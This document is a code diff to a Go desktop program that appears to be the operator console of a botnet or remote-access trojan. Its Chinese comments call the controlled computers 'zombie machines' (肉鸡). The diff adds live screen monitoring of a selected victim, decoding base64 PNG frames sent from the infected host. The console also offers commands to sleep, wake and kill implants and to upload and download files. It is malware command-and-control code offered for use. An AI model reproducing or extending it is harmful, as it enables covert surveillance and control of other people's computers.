@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
@@ -8,6 +9,7 @@ import (
 	"github.com/lxn/walk"
 	. "github.com/lxn/walk/declarative"
 	"golang.org/x/net/websocket"
+	"image/png"
 	"io/ioutil"
 	"os"
 	"strconv"
@@ -23,6 +25,8 @@ const (
 	UPDATE_REMARK  = "30"  //控制台修改备注信息
 	GET_OUT_TEXT   = "40"  //控制台读取肉鸡保存的输出信息
 	SLEEP_ROUSE    = "50"  //休眠/唤醒肉鸡
+	ON_SCREEN      = "70"  //打开监控屏幕
+	OFF_SCREEN     = "71"  //关闭监控屏幕
 	ALL_SLEEP      = "000" //全部休眠
 	CLEAN_OUT_TEXT = "60"  //控制台清空肉鸡输出信息
 	KILL_ME        = "444" //杀了我
@@ -56,12 +60,17 @@ type Message struct {
 	Condoms []*Condom `json:"condoms"`
 }
 
-func NewMessage() Message {
-	if ipInfo.Text() != "" {
-		info := strings.Split(ipInfo.Text(), "--")
-		return Message{Uuid: random, Ip: info[0], Machineid: info[1]}
+func NewMessage(machineid string) Message {
+	if machineid == "" {
+		if ipInfo.Text() != "" {
+			info := strings.Split(ipInfo.Text(), "--")
+			return Message{Uuid: random, Ip: info[0], Machineid: info[1]}
+		} else {
+			return Message{Uuid: random}
+		}
+	} else {
+		return Message{Uuid: random, Machineid: machineid}
 	}
-	return Message{Uuid: random}
 }
 
 func init() {
@@ -164,6 +173,27 @@ func receiveMsg() { //接收返回的消息
 				_ = outTE.SetText(message.Msg)
 			} else if message.Name == SLEEP_ROUSE { //休眠/唤醒提醒
 				outTE.AppendText(message.Ip + " 已唤醒，请继续你的表演！\r\n")
+			} else if message.Name == ON_SCREEN { //渲染屏幕监控
+				if message.Machineid != screenMachineid { //发送过来的是否跟监控的是同一个，不是则放弃渲染
+					continue
+				}
+				ImgBytes, err := base64.StdEncoding.DecodeString(message.Msg) //base64 dec
+				if err != nil {
+					outTE.AppendText("屏幕base64 dec错误:" + err.Error() + "\r\n")
+					continue
+				}
+				ImgIobytes := bytes.Buffer{}
+				ImgIobytes.Write(ImgBytes)
+				imgg, err := png.Decode(&ImgIobytes)
+				if err != nil {
+					outTE.AppendText("屏幕转换错误:" + err.Error() + "\r\n")
+					continue
+				}
+				if bitmap != nil { //删除上一帧
+					bitmap.Dispose()
+				}
+				bitmap, _ = walk.NewBitmapFromImage(imgg) //获取当前帧
+				_ = IMGscreen.SetImage(bitmap)            //渲染当前帧
 			}
 		}
 		time.Sleep(time.Second)
@@ -213,7 +243,7 @@ wait:
 	}
 
 	for {
-		message := NewMessage()
+		message := NewMessage("")
 		message.Name = GET_IP_LIST
 		msgs <- message //发送消息
 		time.Sleep(20 * time.Second)
@@ -396,7 +426,7 @@ func killMe() {
 		walk.MsgBox(tmp, "请先选择要操作的ip", "请先选择要操作的ip", walk.MsgBoxIconInformation)
 		return
 	}
-	message := NewMessage()
+	message := NewMessage("")
 	message.Name = KILL_ME
 	msgs <- message //发送消息
 
@@ -413,6 +443,8 @@ func searchIP(model *CondomModel) {
 			} else if strings.Contains(foo.Name, str) { //hostname有没有
 				modelcheck.items = append(modelcheck.items, foo)
 			} else if strings.Contains(foo.Remark, str) { //备注有没有
+				modelcheck.items = append(modelcheck.items, foo)
+			} else if strings.Contains(foo.Machineid, str) { //唯一识别码有没有
 				modelcheck.items = append(modelcheck.items, foo)
 			}
 		}
@@ -431,7 +463,7 @@ func remarkKeyDown(key walk.Key) {
 		}
 		remarkStr := remark.Text()
 
-		message := NewMessage()
+		message := NewMessage("")
 		message.Name = UPDATE_REMARK
 		message.Msg = remarkStr
 		msgs <- message //发送消息
@@ -454,7 +486,7 @@ func KeyDown(key walk.Key) {      //Down   Up   Return
 			return
 		}
 
-		message := NewMessage()
+		message := NewMessage("")
 		if strings.HasPrefix(cmdStr, "sleep ") { //判断休眠--------------------------------------------------------
 			args := strings.Split(cmdStr, " ") //按空格切割参数
 			if sleeptime, err := strconv.Atoi(args[1]); err != nil || len(args) != 2 || (sleeptime > 0 && sleeptime < 10) || sleeptime < 0 || sleeptime > 600 {
@@ -466,6 +498,15 @@ func KeyDown(key walk.Key) {      //Down   Up   Return
 			message.Msg = args[1] //休眠时间
 		} else if cmdStr == "同志们辛苦了" { //休眠全部-----------------------------------------------------------------------
 			message.Name = ALL_SLEEP
+		} else if strings.HasPrefix(cmdStr, "pmjk ") { //屏幕监控-----------------------------------------------------------------------
+			if screenMachineid != "" { //视频已经存在
+				outTE.AppendText("你已经在监控" + message.Ip + ",如要更换请先关闭！\r\n")
+				return
+			}
+			message.Name = ON_SCREEN
+			message.Msg = cmdStr[5:]            //屏幕刷新间隔
+			screenMachineid = message.Machineid //设置为当前肉鸡渲染
+			go onScreen(ipInfo.Text())
 		} else if strings.HasPrefix(cmdStr, "ddd ") { //判断下载-----------------------------------------------------------------------------
 			args := strings.Split(cmdStr, "ddd ") //按空格切割参数
 			if len(args) != 2 {
@@ -489,6 +530,9 @@ func KeyDown(key walk.Key) {      //Down   Up   Return
 	}
 
 	if "Up" == key.String() { //方向上键
+		if len(cmdHistory) == 0 {
+			return
+		}
 		cmdStr := cmdHistory[cmdHistoryP] //取出下标值
 		cmd.SetText(cmdStr)
 		cmdHistoryP-- //记录当前下标位置
@@ -498,6 +542,9 @@ func KeyDown(key walk.Key) {      //Down   Up   Return
 	}
 
 	if "Down" == key.String() { //方向下键
+		if len(cmdHistory) == 0 {
+			return
+		}
 		cmdStr := cmdHistory[cmdHistoryP] //取出下标值
 		cmd.SetText(cmdStr)
 		cmdHistoryP++ //记录当前下标位置
@@ -532,7 +579,7 @@ func upFile(mw *walk.MainWindow) {
 			return
 		}
 		file64Str := base64.StdEncoding.EncodeToString(fileByts)
-		message := NewMessage()
+		message := NewMessage("")
 		message.Name = UPLOAD_FILE
 		message.FileName = fileNeme
 		message.FileBody = file64Str
@@ -543,8 +590,8 @@ func upFile(mw *walk.MainWindow) {
 
 func clean() {
 	//delete(outTEMap, ipInfo.Text()) //删除本地缓存
-	outTE.SetText("")
-	message := NewMessage()
+	_ = outTE.SetText("")
+	message := NewMessage("")
 	message.Name = CLEAN_OUT_TEXT
 	msgs <- message //发送清空指令
 }
@@ -566,7 +613,7 @@ func tableRowClick(model *CondomModel) {
 	remark.SetText(remarkStr)
 
 	//更换新ip的输出信息
-	message := NewMessage()
+	message := NewMessage("")
 	message.Name = GET_OUT_TEXT
 	msgs <- message //发送指令
 
